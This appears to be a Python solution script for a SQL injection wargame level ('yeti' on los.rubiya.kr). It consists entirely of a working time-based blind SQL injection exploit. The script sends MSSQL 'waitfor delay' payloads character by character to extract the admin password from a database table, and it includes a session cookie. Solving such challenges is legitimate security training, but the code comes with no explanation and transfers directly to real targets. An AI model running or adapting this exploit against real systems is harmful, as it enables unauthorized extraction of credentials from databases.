import requests
import time

url = "https://los.rubiya.kr/chall/yeti_e6afc70b892148ced2d1e063c1230255.php"
cookies = dict(PHPSESSID="33a17d5ikllqctdau572ms56ui")

pw = ''
for i in range(1,17):
    for j in range(48, 128):
        start =time.time()
        payload = f"' if((select substring(pw,{i},1) from prob_yeti where id='admin')='{chr(j)}') waitfor delay '0:0:3' -- "

        response = requests.get(url, cookies=cookies, params={"pw": payload})
        end = time.time()
        if end-start>3:
            pw += chr(j)
            print(j)
            break
print(pw)